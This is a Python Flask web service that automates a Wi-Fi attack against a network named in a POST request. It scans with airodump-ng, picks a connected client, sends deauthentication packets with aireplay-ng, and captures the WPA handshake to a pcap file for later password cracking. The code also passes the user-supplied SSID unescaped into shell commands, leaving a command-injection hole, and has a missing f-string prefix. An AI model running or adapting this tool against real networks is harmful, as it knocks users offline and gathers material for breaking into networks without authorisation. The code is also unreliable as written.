from flask import Flask, request, jsonify
import subprocess
import time
import re
import signal
import os
from dotenv import load_dotenv

app = Flask(__name__)

output_pcap_path = os.getenv('OUTPUT_PCAP_PATH', '/')
wlan_interface = os.getenv('WLAN_INTERFACE', 'wlan1')

def run_command(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def run_command_with_output(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = process.communicate()
    return output.decode('utf-8')

def cleanup():
    subprocess.run(["pkill", "airodump-ng"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(["pkill", "aireplay-ng"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(["airmon-ng", "stop", wlan_interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    ssid = data.get('ssid')

    if not ssid:
        return jsonify({"error": "SSID not provided"}), 400

    try:
        # Kill interfering processes and start monitor mode
        run_command("sudo airmon-ng check kill")
        run_command("sudo airmon-ng start {wlan_interface}")
        time.sleep(5)  # Give it some time to switch to monitor mode

        # Run airodump-ng to scan for the SSID
        cleanup()
        run_command(f"sudo airodump-ng {wlan_interface} > /tmp/airodump_output.txt &")
        time.sleep(15)
        cleanup()

        # Extract BSSID and channel
        with open('/tmp/airodump_output.txt', 'r') as file:
            content = file.read()
        match = re.search(f"{ssid}\s*([\dA-Fa-f:]+)\s*(\d+)", content)
        if not match:
            return jsonify({"error": "SSID not found"}), 404

        bssid = match.group(1)
        channel = match.group(2)

        os.makedirs(output_pcap_path + '/' + ssid, exist_ok=True)

        # Run airodump-ng with the BSSID and channel
        run_command(f"sudo airodump-ng --bssid {bssid} --channel {channel} -w {output_pcap_path}/{ssid}/{ssid} {wlan_interface} > /tmp/airodump_filtered_output.txt &")
        time.sleep(20)
        cleanup()

        # Get the MAC address of a client
        with open('/tmp/airodump_filtered_output.txt', 'r') as file:
            content = file.read()
        match = re.search(r"([\dA-Fa-f:]{17})", content)
        if not match:
            return jsonify({"error": "No clients found"}), 404

        station = match.group(1)

        # Run airodump-ng again
        run_command(f"sudo airodump-ng --bssid {bssid} --channel {channel} -w {ssid} {wlan_interface} > /tmp/airodump_final_output.txt &")

        # Run aireplay-ng for deauth attack
        run_command(f"sudo aireplay-ng --deauth 20 -b {bssid} -a {station} {wlan_interface} &")

        # Check for WPA handshake in the output
        handshake_found = False
        seconds_waited = 0
        while seconds_waited < 30:
            with open('/tmp/airodump_final_output.txt', 'r') as file:
                content = file.read()
            if "WPA handshake" in content:
                handshake_found = True
                break
            time.sleep(1)
            seconds_waited += 1

        if handshake_found:
            time.sleep(10)
            cleanup()
            return jsonify({"status": "WPA Handshake found"}), 200
        else:
            cleanup()
            return jsonify({"status": "WPA Handshake not found within the timeout period"}), 408

    except Exception as e:
        cleanup()
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
